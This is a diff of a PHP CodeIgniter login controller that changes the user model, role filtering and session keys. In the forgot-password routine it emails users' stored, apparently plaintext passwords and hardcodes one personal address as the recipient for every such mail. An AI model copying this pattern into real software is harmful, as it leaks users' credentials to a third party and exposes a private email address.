@@ -5,13 +5,12 @@ class Login extends CI_Controller {
 	public function __construct()
 	{
 		parent::__construct();
-		$this->load->model('model_adminuser');
+		$this->load->model('model_user');
 	}
 
 	public function index()
 	{
 		chk_not_login();
-		//chk_login();
 		$this->data = '';
 		$this->data['msg'] = $this->nsession->userdata('msg');
 		$this->nsession->set_userdata('msg', '');
@@ -20,7 +19,6 @@ class Login extends CI_Controller {
 		$this->elements_data['middle'] = $this->data;			    
 		$this->layout->setLayout('layout_login');
 		$this->layout->multiple_view($this->elements,$this->elements_data);
-		//nis->load->view('login/login');
 	}
 	
 	public function do_login()
@@ -32,10 +30,10 @@ class Login extends CI_Controller {
 		if($remember1 == ''){
 			$remember1 = 'No';
 		}
-		
-		$arrUser = $this->model_adminuser->getSingle($email, $password,$remember1);
-		//pr($arrUser,0);
-		if(count($arrUser) > 0)
+		$role_id = '1,2';
+		$arrUser = $this->model_user->getSingle($email, $password,$remember1,$role_id);
+		//pr($arrUser);
+		if(isset($arrUser['user_id']) && $arrUser['user_id'] != '')
 		{
 			redirect(BACKEND_URL."dashboard");
 		}
@@ -54,7 +52,7 @@ class Login extends CI_Controller {
 		
 		$this->nsession->set_userdata('msg', '');
 		
-		if($this->nsession->userdata('admin_id') != '')
+		if($this->nsession->userdata('user_id') != '')
 		{
 			$url = BACKEND_URL."login/";
 			redirect($url);
@@ -69,7 +67,7 @@ class Login extends CI_Controller {
         public function do_forgotpassword()
         {
             $this->load->library('email');
-            if($this->nsession->userdata('admin_id') != '')
+            if($this->nsession->userdata('user_id') != '')
 	    {
 			$url = BACKEND_URL."login/";
 			redirect($url);
@@ -79,7 +77,7 @@ class Login extends CI_Controller {
             
             	if(isset($email) && !empty($email))
 		{
-			 $arrUser 	= $this->model_adminuser->getUserByEmail($email);			
+			 $arrUser 	= $this->model_user->getUserByEmail($email);			
 		
 			if(count($arrUser) > 0){	
 				
@@ -87,11 +85,11 @@ class Login extends CI_Controller {
 				$first_name 	= $arrUser[0]['first_name'];
 				$last_name 	= $arrUser[0]['last_name'];	
 				$password 	= $arrUser[0]['password'];					
-				$settings 	= $this->model_basic->get_settings('1,6');				
+				$settings 	= $this->model_basic->get_settings('1,2');				
                                 
 				$ConfigMail['mailtype'] 	= 'html';
-				$ConfigMail['to'] 	= $arrUser[0]['email_id'];
-				
+				//$ConfigMail['to'] 	= $arrUser[0]['email_id'];
+				$ConfigMail['to'] 	= 'begam.nasmin91@gmail.com';
 				$ConfigMail['from']	= $settings['webmaster_email'];
 				$ConfigMail['from_name']= $settings['sitename'];
 				
@@ -107,9 +105,8 @@ class Login extends CI_Controller {
                                 $ConfigMail['message'].= '</br>';
                                 $ConfigMail['message'].= '<a href="'.BACKEND_URL.'">'.BACKEND_URL.'</a>';
                                 $ConfigMail['message'].= '</body></html>';
-					//print_r($ConfigMail);exit;	
+				//print_r($ConfigMail);exit;	
 				$mail 		= send_email($ConfigMail);
-				
 				if($mail)	
 				{	
 					$msg = 'Password sent to your mail address. Please check.';	
@@ -129,6 +126,6 @@ class Login extends CI_Controller {
 		
             
         }
-	
+    
 	
 }
